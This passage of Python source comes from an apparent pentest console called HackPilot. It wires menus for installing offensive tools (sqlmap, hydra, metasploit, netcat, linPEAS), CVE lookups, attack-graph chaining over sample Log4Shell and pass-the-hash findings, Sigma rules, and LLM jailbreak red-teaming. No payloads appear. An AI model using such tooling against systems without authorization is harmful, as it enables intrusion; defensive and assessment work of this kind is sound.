            model_table.add_column("Model ID", style="cyan")
            model_table.add_column("Provider", style="yellow")
            model_table.add_column("Display Name", style="white")
            model_table.add_column("Context Window", style="green")
            
            for m in all_models[:8]:
                model_table.add_row(m.model_id, m.provider.value, m.display_name, f"{m.context_window:,} tokens")
            self.console.print(model_table)
        except Exception as e:
            self.console.print(f"[yellow]Model registry catalog: {e}[/yellow]")
            
        if hasattr(self.ai_engine, 'get_current_model'):
            curr = self.ai_engine.get_current_model()
            self.console.print(f"\n[green]Current Active Model:[/green] {curr.get('model_id', 'default')}")
        
        try:
            if Confirm.ask("\n[cyan]Would you like to auto-fetch the latest models from all configured providers?[/cyan]", default=False):
                self.fetch_and_show_models()
        except Exception:
            pass

    def fetch_and_show_models(self, providers=None, force_refresh: bool = False):
        """Auto-fetch models from AI providers and print the discovered models table."""
        self.console.print(Panel("[bold cyan]Auto-Fetching AI Models from Remote Providers[/bold cyan]"))
        try:
            from ai_engine.model_registry import fetch_all_provider_models, list_all_models
            self.console.print("[cyan]Contacting configured provider endpoints (OpenAI, Claude, Gemini, DeepSeek, GLM, OpenRouter, 9B Router, Custom)...[/cyan]")
            discovered = fetch_all_provider_models(providers=providers, force_refresh=force_refresh)
            
            total_discovered = sum(len(models) for models in discovered.values())
            self.console.print(f"[bold green]✓ Auto-fetch complete: {total_discovered} models discovered across {len(discovered)} providers.[/bold green]\n")
            
            table = Table(title="Newly Discovered & Active AI Models")
            table.add_column("Provider", style="yellow")
            table.add_column("Model ID", style="cyan")
            table.add_column("Display Name", style="white")
            table.add_column("Context Window", style="green")
            table.add_column("Tools", style="magenta")
            
            for prov_name, models in discovered.items():
                for m in models:
                    table.add_row(
                        prov_name,
                        m.model_id,
                        m.display_name,
                        f"{m.context_window:,} tokens",
                        "✓" if m.supports_tools else "✗"
                    )
            
            if total_discovered > 0:
                self.console.print(table)
            else:
                self.console.print("[yellow]No new remote models discovered (endpoints unreachable or API keys not set). Static catalog models remain available.[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error fetching remote models: {e}[/red]")

    def list_and_show_models(self):
        """Display all available AI models across all registered and dynamic catalogs."""
        self.console.print(Panel("[bold cyan]All Available HackPilot AI Models[/bold cyan]"))
        try:
            from ai_engine.model_registry import list_all_models
            all_models = list_all_models()
            
            table = Table(title=f"Complete AI Model Catalog ({len(all_models)} Models)")
            table.add_column("Model ID", style="cyan")
            table.add_column("Provider", style="yellow")
            table.add_column("Display Name", style="white")
            table.add_column("Context Window", style="green")
            table.add_column("Tools", style="magenta")
            
            for m in all_models:
                table.add_row(
                    m.model_id,
                    m.provider.value,
                    m.display_name,
                    f"{m.context_window:,} tokens",
                    "✓" if m.supports_tools else "✗"
                )
            self.console.print(table)
        except Exception as e:
            self.console.print(f"[red]Error listing models: {e}[/red]")

    def manage_tools(self):
        """Inspect and install security tools"""
        self.console.print(Panel("[bold cyan]Security Tools & Environment Manager[/bold cyan]"))
        
        tools_to_check = ['nmap', 'masscan', 'nikto', 'gobuster', 'sqlmap', 'hydra', 'whois', 'curl']
        tool_table = Table(title="Core Security Tool Availability")
        tool_table.add_column("Tool", style="cyan")
        tool_table.add_column("Installed", style="bold")
        tool_table.add_column("Install Command", style="dim")
        
        missing = []
        for t in tools_to_check:
            available = self.tool_manager.check_tool(t)
            status = "[green]✓ Installed[/green]" if available else "[red]✗ Missing[/red]"
            install_cmd = self.tool_manager.TOOL_COMMANDS.get(t, "N/A")
            tool_table.add_row(t, status, install_cmd)
            if not available:
                missing.append(t)
                
        self.console.print(tool_table)
        if missing and Confirm.ask(f"\n[cyan]Would you like to install {len(missing)} missing tools automatically?[/cyan]", default=False):
            self.tool_manager.ensure_tools(missing)

    def voice_command_mode(self):
        """Interactive voice command interface mode"""
        self.console.print(Panel("[bold cyan]Enterprise Voice Command Mode[/bold cyan]"))
        self.console.print("Supported Voice Commands:")
        self.console.print("  • 'start full pentest' - Run complete assessment")
        self.console.print("  • 'view reports'      - Display latest reports")
        self.console.print("  • 'system status'     - Show current system status")
        self.console.print("  • 'exit'              - Return to main menu\n")
        
        if not self.voice_interface:
            self.console.print("[yellow]Voice synthesis/recognition hardware unavailable. Using text simulation mode.[/yellow]")
            cmd = Prompt.ask("[cyan]Enter voice command text (or 'exit')[/cyan]", default="system status")
            if "status" in cmd.lower():
                self.show_banner()
            elif "report" in cmd.lower():
                self.view_reports_analytics()
            elif "pentest" in cmd.lower():
                self.run_full_enterprise_pentest()
        else:
            self.console.print("[green]Voice interface ready. Listening for commands...[/green]")
            cmd = self.voice_interface.listen_for_command()
            if cmd:
                self.console.print(f"[cyan]Heard command: {cmd}[/cyan]")

    # ==================== Threat Intelligence & Attack Graph Chaining ====================

    def run_threat_intelligence_and_attack_chaining(self):
        """Interactive Threat Intelligence & Attack Graph Chaining Console"""
        self.console.print(Panel(
            "[bold cyan]AI Threat Intelligence & Attack Graph Chaining Engine[/bold cyan]\n"
            "Query CVEs, compute EPSS probabilities, evaluate CISA KEV active exploitation, "
            "synthesize multi-stage attack graphs, identify critical defensive chokepoints, and generate Mermaid diagrams."
        ))

        intel_menu = Table(title="Threat Intelligence & Attack Chaining Options")
        intel_menu.add_column("Option", style="cyan")
        intel_menu.add_column("Description", style="white")

        intel_options = [
            ("1", "CVE Threat Intelligence Lookup & EPSS Scoring"),
            ("2", "Automated Attack Graph & Chaining (Sample Scenario)"),
            ("3", "Generate Mermaid Attack Graph Diagram"),
            ("4", "CISA KEV (Known Exploited Vulnerabilities) Triage"),
            ("5", "MITRE D3FEND Countermeasure Defense Matrix"),
            ("6", "Export Detection-as-Code (Sigma Rules & Splunk SPL)"),
            ("7", "Generate Automated Hardening Playbooks (Ansible & Bash)"),
            ("0", "Return to Main Menu")
        ]

        for option, desc in intel_options:
            intel_menu.add_row(option, desc)

        self.console.print(intel_menu)
        choice = Prompt.ask("[cyan]Select option[/cyan]", choices=[o[0] for o in intel_options])

        if choice == "0":
            return
        elif choice == "1":
            self.cve_intelligence_lookup()
        elif choice == "2":
            self.attack_chain_analysis(sample_mode=True)
        elif choice == "3":
            self.attack_chain_analysis(sample_mode=True, mermaid_only=True)
        elif choice == "4":
            self.cisa_kev_triage()
        elif choice == "5":
            self.show_d3fend_matrix()
        elif choice == "6":
            self.export_sigma_detection_rules()
        elif choice == "7":
            self.generate_remediation_playbooks()

    def cve_intelligence_lookup(self, query=None):
        """Look up CVE threat intelligence with CVSS, EPSS, and KEV metrics."""
        if not self.cve_intel:
            self.console.print("[red]CVE Intelligence Engine is not initialized.[/red]")
            return

        if not query:
            query = Prompt.ask("[cyan]Enter CVE ID or search text (e.g. CVE-2021-44228 or Apache Log4j)[/cyan]", default="CVE-2021-44228")

        detected = self.cve_intel.extract_cves(query)
        lookup_ids = detected if detected else [query.strip().upper()]

        intel_table = Table(title="CVE Threat Intelligence & EPSS Scores", show_header=True)
        intel_table.add_column("CVE ID", style="bold cyan")
        intel_table.add_column("Title", style="white")
        intel_table.add_column("CVSS v3.1", style="bold red")
        intel_table.add_column("Severity", style="magenta")
        intel_table.add_column("EPSS Exploit Prob", style="yellow")
        intel_table.add_column("CISA KEV", style="bold red")
        intel_table.add_column("Weaponized", style="bold yellow")
        intel_table.add_column("Prioritized Risk", style="bold red")
        intel_table.add_column("Source", style="bold")

        found_any = False
        any_heuristic = False
        for cid in lookup_ids:
            info = self.cve_intel.lookup_cve(cid)
            if info:
                found_any = True
                sev_color = "bold red" if info.severity == "CRITICAL" else "red" if info.severity == "HIGH" else "yellow"
                kev_display = "[bold red]YES[/bold red]" if info.in_cisa_kev else "[green]NO[/green]"
                weap_display = "[bold red]YES[/bold red]" if info.weaponized else "[green]NO[/green]"
                if info.is_heuristic_estimate:
                    any_heuristic = True
                    source_display = "[bold yellow]⚠ Heuristic estimate[/bold yellow]"
                else:
                    source_display = "[green]Curated[/green]"
                intel_table.add_row(
                    info.cve_id,
                    info.title[:45] + ("..." if len(info.title) > 45 else ""),
                    f"{info.cvss_score:.1f}",
                    f"[{sev_color}]{info.severity}[/{sev_color}]",
                    f"{info.epss_score * 100:.1f}% (top {100 - (info.epss_percentile * 100):.1f}%)",
                    kev_display,
                    weap_display,
                    f"{info.prioritized_risk_score:.2f}/10.0",
                    source_display
                )

        if found_any:
            self.console.print(intel_table)
            if any_heuristic:
                self.console.print(
                    "[yellow]⚠ Rows marked 'Heuristic estimate' are NOT real threat intelligence. "
                    "This CVE is not in HackPilot's curated database, so CVSS/EPSS/KEV/weaponized "
                    "values above are generic placeholders, not verified NVD/CISA/FIRST data. "
                    "Confirm details at nvd.nist.gov before acting on them.[/yellow]"
                )
        else:
            self.console.print(f"[yellow]No threat intelligence records matched '{query}'.[/yellow]")

    def attack_chain_analysis(self, sample_mode=True, mermaid_only=False, findings=None):
        """Synthesize and display automated multi-stage attack graphs and chokepoints."""
        if not self.attack_chainer:
            self.console.print("[red]Attack Chaining Engine is not initialized.[/red]")
            return

        if not findings:
            # High-impact representative multi-stage enterprise assessment scenario
            findings = [
                {
                    "id": "vuln-01",
                    "title": "Apache Path Traversal and File Read",
                    "cve": "CVE-2021-41773",
                    "category": "web",
                    "severity": "high",
                    "target": "web.internal.corp",
                    "description": "Path traversal allowing arbitrary file disclosure and potential RCE."
                },
                {
                    "id": "vuln-02",
                    "title": "Log4Shell JNDI Remote Code Execution",
                    "cve": "CVE-2021-44228",
                    "category": "web",
                    "severity": "critical",
                    "target": "api.internal.corp",
                    "description": "Remote code execution via unauthenticated JNDI LDAP lookup."
                },
                {
                    "id": "vuln-03",
                    "title": "Polkit PwnKit Local Privilege Escalation",
                    "cve": "CVE-2021-4034",
                    "category": "system",
                    "severity": "high",
                    "target": "api.internal.corp",
                    "description": "Local privilege escalation to root via pkexec."
                },
                {
                    "id": "vuln-04",
                    "title": "Exposed Kerberos Ticket Hashes in Memory",
                    "category": "system",
                    "severity": "high",
                    "target": "dc01.internal.corp",
                    "description": "Credential access via LSASS memory dumping."
                },
                {
                    "id": "vuln-05",
                    "title": "SMB Lateral Pivot via Pass-the-Hash",
                    "category": "network",
                    "severity": "critical",
                    "target": "finance-sql.internal.corp",
                    "description": "Lateral movement across segmented enterprise network."
                }
            ]

        # Enrich with CVE intelligence if available
        if self.cve_intel:
            findings = self.cve_intel.enrich_findings(findings)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Synthesizing Multi-Stage Attack Graph...", total=100)
            graph = self.attack_chainer.synthesize_attack_graph(findings)
            progress.update(task, completed=100)

        if mermaid_only:
            mermaid_syntax = graph.to_mermaid("HackPilot Attack Chain Graph")
            self.console.print(Panel(mermaid_syntax, title="[bold green]Mermaid Attack Graph Flowchart[/bold green]"))
            return

        # Display Summary
        paths = graph.find_all_paths()
        chokepoints = graph.find_critical_chokepoints()
        roadmap = self.attack_chainer.generate_remediation_roadmap(graph)

        self.console.print(f"\n[bold green]✓ Synthesized Attack Graph:[/bold green] {len(graph.nodes)} Nodes | {len(graph.edges)} Edges | {len(paths)} Complete Attack Paths")

        # Critical Chokepoints Table
        if chokepoints:
            chk_table = Table(title="🛡️ Critical Defensive Chokepoints (Highest Mitigation ROI)", show_header=True)
            chk_table.add_column("Rank", style="bold cyan")
            chk_table.add_column("Chokepoint Node", style="white")
            chk_table.add_column("MITRE Technique", style="yellow")
            chk_table.add_column("Stage", style="magenta")
            chk_table.add_column("Paths Severed", style="bold red")
            chk_table.add_column("Mitigation ROI", style="bold green")

            for idx, chk in enumerate(chokepoints[:5], 1):
                chk_table.add_row(
                    str(idx),
                    chk["label"][:40],
                    chk["mitre_technique"],
                    chk["stage"],
                    f"{chk['affected_chains_count']}/{chk['total_chains']} ({chk['coverage_percentage']}%)",
                    f"{chk['mitigation_roi']:.2f}"
                )
            self.console.print(chk_table)

        # Strategic Remediation Roadmap
        if roadmap:
            road_table = Table(title="📋 Strategic Remediation Priority Roadmap", show_header=True)
            road_table.add_column("Priority", style="bold cyan")
            road_table.add_column("Action Summary", style="white")
            road_table.add_column("Urgency", style="bold red")

            for item in roadmap[:4]:
                road_table.add_row(
                    f"#{item['priority_rank']}",
                    item["strategic_action"],
                    item["urgency"]
                )
            self.console.print(road_table)

        # Mermaid Diagram
        mermaid_syntax = graph.to_mermaid("HackPilot Synthesized Attack Graph")
        self.console.print(Panel(mermaid_syntax, title="[bold green]Mermaid Attack Graph Syntax[/bold green]"))

    def cisa_kev_triage(self):
        """Display known exploited vulnerabilities requiring immediate compliance attention."""
        if not self.cve_intel:
            self.console.print("[red]CVE Intelligence Engine is not initialized.[/red]")
            return

        # Check known high profile CVEs in knowledge base
        kev_items = [
            info for info in [self.cve_intel.lookup_cve(c) for c in self.cve_intel.database.keys()]
            if info and info.in_cisa_kev
        ]

        table = Table(title="🚨 CISA KEV (Known Exploited Vulnerabilities) Emergency Triage", show_header=True)
        table.add_column("CVE ID", style="bold cyan")
        table.add_column("Vulnerability Name", style="white")
        table.add_column("CVSS", style="bold red")
        table.add_column("EPSS Score", style="bold yellow")
        table.add_column("Recommended Remediation", style="green")

        for item in kev_items:
            table.add_row(
                item.cve_id,
                item.title[:45] + ("..." if len(item.title) > 45 else ""),
                f"{item.cvss_score:.1f}",
                f"{item.epss_score * 100:.1f}%",
                item.remediation[:50] + ("..." if len(item.remediation) > 50 else "")
            )

        self.console.print(table)
        self.console.print("[bold red]Note: Any asset matching CISA KEV vulnerabilities must be prioritized for emergency patching.[/bold red]\n")

    def _get_sample_findings(self):
        """Standard high-impact multi-stage enterprise assessment findings."""
        return [
            {
                "id": "vuln-01",
                "title": "Apache Path Traversal and File Read",
                "cve": "CVE-2021-41773",
                "category": "web",
                "severity": "high",
                "target": "web.internal.corp",
                "description": "Path traversal allowing arbitrary file disclosure and potential RCE."
            },
            {
                "id": "vuln-02",
                "title": "Log4Shell JNDI Remote Code Execution",
                "cve": "CVE-2021-44228",
                "category": "web",
                "severity": "critical",
                "target": "api.internal.corp",
                "description": "Remote code execution via unauthenticated JNDI LDAP lookup."
            },
            {
                "id": "vuln-03",
                "title": "Polkit PwnKit Local Privilege Escalation",
                "cve": "CVE-2021-4034",
                "category": "system",
                "severity": "high",
                "target": "api.internal.corp",
                "description": "Local privilege escalation to root via pkexec."
            },
            {
                "id": "vuln-04",
                "title": "Exposed Kerberos Ticket Hashes in Memory",
                "category": "system",
                "severity": "high",
                "target": "dc01.internal.corp",
                "description": "Credential access via LSASS memory dumping."
            },
            {
                "id": "vuln-05",
                "title": "SMB Lateral Pivot via Pass-the-Hash",
                "category": "network",
                "severity": "critical",
                "target": "finance-sql.internal.corp",
                "description": "Lateral movement across segmented enterprise network."
            }
        ]

    def show_d3fend_matrix(self, findings=None):
        """Map synthesized attack paths to official MITRE D3FEND defensive countermeasures."""
        if not self.attack_chainer:
            self.console.print("[red]Attack Chaining Engine is not initialized.[/red]")
            return

        findings = findings or self._get_sample_findings()
        if self.cve_intel:
            findings = self.cve_intel.enrich_findings(findings)

        graph = self.attack_chainer.synthesize_attack_graph(findings)
        d3fend_items = graph.to_d3fend_matrix()

        table = Table(title="🛡️ MITRE D3FEND Defensive Countermeasure Matrix", show_header=True)
        table.add_column("D3FEND ID", style="bold cyan")
        table.add_column("Countermeasure Name", style="white")
        table.add_column("Tactic", style="yellow")
        table.add_column("Target Technique", style="bold red")
        table.add_column("Strength", style="green")
        table.add_column("Implementation Guidance", style="dim white")

        for item in d3fend_items:
            table.add_row(
                item["d3fend_id"],
                item["d3fend_name"],
                item["defensive_tactic"],
                item["mitre_technique"],
                f"{item['mitigation_strength'] * 100:.0f}%",
                item["description"][:55] + ("..." if len(item["description"]) > 55 else "")
            )

        self.console.print(table)

    def export_sigma_detection_rules(self, findings=None):
        """Generate and display Detection-as-Code Sigma Rules & Splunk SPL queries."""
        if not self.attack_chainer:
            self.console.print("[red]Attack Chaining Engine is not initialized.[/red]")
            return

        findings = findings or self._get_sample_findings()
        graph = self.attack_chainer.synthesize_attack_graph(findings)
        rules = graph.export_sigma_rules()

        table = Table(title="🔍 Detection-as-Code: Sigma Rules & SIEM Queries", show_header=True)
        table.add_column("Rule ID", style="cyan")
        table.add_column("Threat Target", style="white")
        table.add_column("ATT&CK Tech", style="bold red")
        table.add_column("Stage", style="magenta")
        table.add_column("Splunk SPL Query", style="yellow")

        for r in rules:
            table.add_row(
                r["rule_id"][:12] + "...",
                r["label"][:35],
                r["technique"],
                r["stage"],
                r["splunk_spl"][:60] + ("..." if len(r["splunk_spl"]) > 60 else "")
            )

        self.console.print(table)
        if rules:
            self.console.print(Panel(rules[0]["sigma_yaml"], title=f"[bold green]Sample Sigma YAML Rule ({rules[0]['label']})[/bold green]"))

    def generate_remediation_playbooks(self, findings=None):
        """Generate automated Ansible and Bash remediation playbooks for defensive chokepoints."""
        if not self.attack_chainer:
            self.console.print("[red]Attack Chaining Engine is not initialized.[/red]")
            return

        findings = findings or self._get_sample_findings()
        graph = self.attack_chainer.synthesize_attack_graph(findings)
        ansible_code = graph.generate_ansible_playbook()
        bash_code = graph.generate_hardening_script()

        self.console.print(Panel(ansible_code, title="[bold green]Automated Remediation Ansible Playbook (YAML)[/bold green]"))
        self.console.print(Panel(bash_code, title="[bold cyan]Automated Defense Hardening Script (Bash)[/bold cyan]"))

    def run_llm_red_team(self, model_id=None, mock=False):
        """Execute AI Red Teaming & LLM Security Assessment against OWASP Top 10 for LLMs."""
        if not self.llm_red_team:
            self.console.print("[red]AI Red Teaming Engine is not initialized.[/red]")
            return

        target_model = model_id or self.model_id or "gpt-4o"
        self.console.print(Panel(
            f"[bold cyan]AI Red Teaming & LLM Security Assessment[/bold cyan]\n"
            f"Target Model: [bold yellow]{target_model}[/bold yellow] | Framework: [bold green]OWASP Top 10 for LLM Applications (2025/2026)[/bold green]\n"
            "Testing adversarial prompt injection, jailbreaks, output handling, excessive agency, and sensitive disclosure."
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Executing adversarial red team probes...", total=100)
            if mock or not config.OPENAI_API_KEY:
                report = self.llm_red_team.scan_mock(simulate_safe=True)
            else:
                provider_inst = getattr(self.ai_engine, "active_provider", None) if hasattr(self, "ai_engine") else None
                report = self.llm_red_team.scan_model(model_id=target_model, provider_instance=provider_inst)
            progress.update(task, completed=100)

        # Print Scorecard
        score_color = "bold green" if report.robustness_score >= 85 else "bold yellow" if report.robustness_score >= 65 else "bold red"
        scorecard = Table(title="🎯 AI Red Teaming Robustness Scorecard", show_header=True)
        scorecard.add_column("Target Model", style="cyan")
        scorecard.add_column("Probes Tested", style="white")
        scorecard.add_column("Vulnerabilities", style="bold red")
        scorecard.add_column("Robustness Score", style=score_color)
        scorecard.add_column("Risk Grade", style=score_color)

        scorecard.add_row(
            report.target_model,
            str(report.total_probes),
            str(report.vulnerabilities_detected),
            f"{report.robustness_score:.1f}%",
            report.risk_grade
        )
        self.console.print(scorecard)

        # Print Category Breakdown
        cat_table = Table(title="📊 OWASP LLM Category Breakdown", show_header=True)
        cat_table.add_column("OWASP LLM Category", style="cyan")
        cat_table.add_column("Probes", style="white")
        cat_table.add_column("Violations", style="bold red")
        cat_table.add_column("Pass Rate", style="green")

        for cat_name, cat_data in report.category_breakdown.items():
            if cat_data["probes_tested"] > 0:
                pass_rate = cat_data["pass_rate_pct"]
                pr_color = "green" if pass_rate >= 80 else "yellow" if pass_rate >= 50 else "red"
                cat_table.add_row(
                    cat_name,
                    str(cat_data["probes_tested"]),
                    str(cat_data["vulnerabilities"]),
                    f"[{pr_color}]{pass_rate:.1f}%[/{pr_color}]"
                )
        self.console.print(cat_table)

        # Print Recommendations & Guardrails
        if report.hardening_recommendations:
            rec_panel = "\n".join([f"• {r}" for r in report.hardening_recommendations])
            self.console.print(Panel(rec_panel, title="[bold yellow]Strategic Hardening Directives[/bold yellow]"))

        self.console.print(Panel(
            report.system_prompt_guardrails[:600] + "\n... [truncated]",
            title="[bold green]Compiled System Prompt Defensive Guardrails[/bold green]"
        ))

    def run_api_security_scan(self, spec_input=None, mock=False):
        """Execute API Security & OpenAPI Audit against OWASP API Security Top 10."""
        if not self.api_scanner:
            self.console.print("[red]API Security Scanner is not initialized.[/red]")
            return

        self.console.print(Panel(
            "[bold cyan]API Security Assessment & OpenAPI / Swagger Auditor[/bold cyan]\n"
            "Framework: [bold green]OWASP API Security Top 10 (2023-2026)[/bold green]\n"
            "Auditing BOLA / IDOR, Broken Authentication, Mass Assignment (BOPLA), BFLA, SSRF, and Misconfigurations."
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Analyzing OpenAPI endpoints & schemas...", total=100)
            if spec_input:
                report = self.api_scanner.scan_spec(spec_input)
            else:
                report = self.api_scanner.scan_mock()
            progress.update(task, completed=100)

        # Print Scorecard
        score_color = "bold green" if report.security_score >= 80 else "bold yellow" if report.security_score >= 60 else "bold red"
        scorecard = Table(title="🛡️ API Security Scorecard", show_header=True)
        scorecard.add_column("API Title", style="cyan")
        scorecard.add_column("Version", style="yellow")
        scorecard.add_column("Endpoints Scanned", style="white")
        scorecard.add_column("Findings", style="bold red")
        scorecard.add_column("Security Score", style=score_color)
        scorecard.add_column("Risk Rating", style=score_color)

        scorecard.add_row(
            report.api_title,
            report.api_version,
            str(report.endpoints_scanned),
            f"{report.total_findings} (Crit: {report.critical_count}, High: {report.high_count})",
            f"{report.security_score:.1f}/100",
            report.risk_rating
        )
        self.console.print(scorecard)

        # Print Findings Table
        if report.findings:
            find_table = Table(title="⚠️ Detected API Security Vulnerabilities", show_header=True)
            find_table.add_column("ID", style="cyan")
            find_table.add_column("Title", style="white")
            find_table.add_column("Method", style="magenta")
            find_table.add_column("Endpoint", style="bold yellow")
            find_table.add_column("Severity", style="bold red")
            find_table.add_column("CVSS", style="bold red")
            find_table.add_column("Remediation", style="green")

            for f in report.findings[:8]:
                sev_color = "bold red" if f.severity in ("critical", "high") else "yellow"
                find_table.add_row(
                    f.finding_id[:16],
                    f.title[:30],
                    f.http_method,
                    f.endpoint[:28],
                    f"[{sev_color}]{f.severity.upper()}[/{sev_color}]",
                    f"{f.cvss_score:.1f}",
                    f.remediation[:45] + ("..." if len(f.remediation) > 45 else "")
                )
            self.console.print(find_table)

        # Print Recommendations
        if report.hardening_recommendations:
            rec_text = "\n".join([f"• {r}" for r in report.hardening_recommendations])
            self.console.print(Panel(rec_text, title="[bold yellow]API Hardening Recommendations[/bold yellow]"))

    def run_cspm_scan(self, target_input=None, export_fixes=False):
        """Execute Cloud Security Posture (CSPM) & Kubernetes (KSPM) Audit against CIS Benchmarks."""
        if not self.cspm_scanner:
            self.console.print("[red]Cloud Security Posture (CSPM) Scanner is not initialized.[/red]")
            return

        self.console.print(Panel(
            "[bold cyan]Cloud Security Posture Management (CSPM) & K8s Security Auditor[/bold cyan]\n"
            "Frameworks: [bold green]CIS AWS Foundations v3.0 | CIS Kubernetes v1.8 | NIST SP 800-53 | MITRE ATT&CK Cloud[/bold green]\n"
            "Auditing AWS, Azure, GCP & Kubernetes for storage exposure, IAM wildcards, open security groups, and pod privilege escalation."
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Auditing cloud infrastructure & Kubernetes manifests...", total=100)
            if target_input and target_input != 'mock':
                report = self.cspm_scanner.scan_path(target_input)
            else:
                report = self.cspm_scanner.scan_mock()
            progress.update(task, completed=100)

        # Print Scorecard
        score_color = "bold green" if report.compliance_score >= 80 else "bold yellow" if report.compliance_score >= 60 else "bold red"
        scorecard = Table(title="☁️ Cloud Security Posture Scorecard", show_header=True)
        scorecard.add_column("Environment", style="cyan")
        scorecard.add_column("Resources Scanned", style="white")
        scorecard.add_column("Findings", style="bold red")
        scorecard.add_column("Compliance Score", style=score_color)
        scorecard.add_column("CIS Pass Rate", style=score_color)

        scorecard.add_row(
            report.environment_name[:36],
            str(report.total_resources_scanned),
            f"{report.total_findings} (Crit: {report.critical_count}, High: {report.high_count}, Med: {report.medium_count})",
            f"{report.compliance_score:.1f}%",
            f"{report.cis_pass_rate:.1f}%"
        )
        self.console.print(scorecard)

        # Print Findings Table
        if report.findings:
            find_table = Table(title="⚠️ Detected Cloud & Container Misconfigurations", show_header=True)
            find_table.add_column("ID", style="cyan", width=16)
            find_table.add_column("Provider", style="magenta", width=10)
            find_table.add_column("Severity", style="bold red", width=10)
            find_table.add_column("Resource", style="bold yellow", width=26)
            find_table.add_column("Title", style="white", width=30)
            find_table.add_column("CIS Benchmark", style="green", width=16)
            find_table.add_column("MITRE Tactic", style="cyan", width=18)

            for f in report.findings[:10]:
                sev_color = "bold red" if f.severity in ("critical", "high") else "yellow"
                find_table.add_row(
                    f.finding_id,
                    f.provider.value,
                    f"[{sev_color}]{f.severity.value.upper()}[/{sev_color}]",
                    f.resource_id[:24],
                    f.title[:28],
                    f.cis_benchmark,
                    f.mitre_tactic
                )
            self.console.print(find_table)

        # AI Threat Analysis & Blast Radius (if available)
        if self.ai_engine and hasattr(self.ai_engine, "analyze_cloud_posture"):
            ai_threat = self.ai_engine.analyze_cloud_posture(report)
            blast_color = "bold red" if "TAKEOVER" in ai_threat.get("assessed_blast_radius", "") else "bold yellow"
            threat_lines = [
                f"[bold]Assessed Blast Radius:[/bold] [{blast_color}]{ai_threat.get('assessed_blast_radius')}[/{blast_color}]",
                "[bold]Synthesized Attack Paths:[/bold]"
            ]
            for sc in ai_threat.get("synthesized_attack_scenarios", []):
                threat_lines.append(f"  • {sc}")
            self.console.print(Panel("\n".join(threat_lines), title="🤖 AI Cloud Threat & Blast Radius Analysis"))

        # Hardening Roadmap
        if report.hardening_roadmap:
            road_text = "\n".join([f"• {r}" for r in report.hardening_roadmap])
            self.console.print(Panel(road_text, title="[bold yellow]Cloud Hardening Roadmap[/bold yellow]"))

        # Export fixes
        if export_fixes:
            script_out = report.export_remediation_script(script_format="bash")
            tf_out = report.export_remediation_script(script_format="terraform")
            if isinstance(export_fixes, str) and export_fixes.strip():
                out_sh = Path(export_fixes)
                out_tf = out_sh.with_suffix(".tf") if out_sh.suffix == ".sh" else Path(f"{export_fixes}.tf")
            else:
                out_sh = Path("reports/cloud_remediation.sh")
                out_tf = Path("reports/cloud_remediation.tf")
            out_sh.parent.mkdir(exist_ok=True, parents=True)
            out_sh.write_text(script_out, encoding="utf-8")
            out_tf.write_text(tf_out, encoding="utf-8")
            self.console.print(f"[bold green]✓ Exported automated remediation scripts:[/bold green] {out_sh} and {out_tf}")

    def run(self):
        """Main application loop"""
        self.show_banner()
        
        while True:
            try:
                self.show_main_menu()
                choice = Prompt.ask("[cyan]Select option[/cyan]", 
                                  choices=[str(i) for i in range(21)])
                
                if choice == "0":
                    self.console.print("[green]Shutting down HackPilot Enterprise...[/green]")
                    self.shutdown()
                    break
                elif choice == "1":
                    self.run_full_enterprise_pentest()
                elif choice == "2":
                    self.run_specific_phase()
                elif choice == "3":
                    self.run_custom_workflow()
                elif choice == "4":
                    self.view_reports_analytics()
                elif choice == "5":
                    self.generate_executive_summary()
                elif choice == "6":
                    self.start_realtime_dashboard()
                elif choice == "7":
                    self.manage_users_permissions()
                elif choice == "8":
                    self.system_configuration()
                elif choice == "9":
                    self.compliance_management()
                elif choice == "10":
                    self.manage_cloud_services()
                elif choice == "11":
                    self.configure_ai_engine()
                elif choice == "12":
                    self.manage_tools()
                elif choice == "13":
                    self.start_api_server()
                elif choice == "14":
                    self.voice_command_mode()
                elif choice == "15":
                    self.launch_web_dashboard()
                elif choice == "16":
                    self.run_soc_analysis()
                elif choice == "17":
                    self.run_threat_intelligence_and_attack_chaining()
                elif choice == "18":
                    self.run_llm_red_team()
                elif choice == "19":
                    self.run_api_security_scan()
                elif choice == "20":
                    self.run_cspm_scan()
                    
            except KeyboardInterrupt:
                self.console.print("\n[yellow]Use option 0 to exit properly[/yellow]")
            except Exception as e:
                self.logger.error(f"Application error: {e}")
                self.console.print(f"[red]Error: {e}[/red]")
    
    def shutdown(self):
        """Graceful shutdown of all services"""
        self.console.print("[cyan]Shutting down services...[/cyan]")
        
        try:
            if self.processor:
                self.processor.stop()
            if self.service_registry:
                self.service_registry.stop()
            if self.realtime_dashboard:
                self.realtime_dashboard.running = False
            
            self.console.print("[green]All services shut down successfully[/green]")
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")

# Placeholder classes for missing components
# Placeholder classes for missing components
class EnterpriseToolManager:
    """Enterprise tool manager with advanced features"""
    
    TOOL_COMMANDS = {
        'nmap': 'sudo apt install -y nmap',
        'masscan': 'sudo apt install -y masscan',
        'nikto': 'sudo apt install -y nikto',
        'gobuster': 'sudo apt install -y gobuster',
        'sqlmap': 'sudo apt install -y sqlmap',
        'hydra': 'sudo apt install -y hydra',
        'theharvester': 'sudo apt install -y theharvester',
        'enum4linux': 'sudo apt install -y enum4linux',
        'whatweb': 'sudo apt install -y whatweb',
        'wpscan': 'sudo apt install -y wpscan',
        'dnsenum': 'sudo apt install -y dnsenum',
        'whois': 'sudo apt install -y whois',
        'searchsploit': 'sudo apt install -y exploitdb',
        'metasploit-framework': 'sudo apt install -y metasploit-framework',
        'netcat': 'sudo apt install -y netcat-traditional',
        'curl': 'sudo apt install -y curl',
        'wget': 'sudo apt install -y wget',
    }
    
    GITHUB_TOOLS = {
        'linpeas': {
            'url': 'https://github.com/carlospolop/PEASS-ng.git',
            'path': '/opt/PEASS-ng',
            'executable': '/opt/PEASS-ng/linPEAS/linpeas.sh'
        },
        'winpeas': {
            'url': 'https://github.com/carlospolop/PEASS-ng.git',
            'path': '/opt/PEASS-ng',
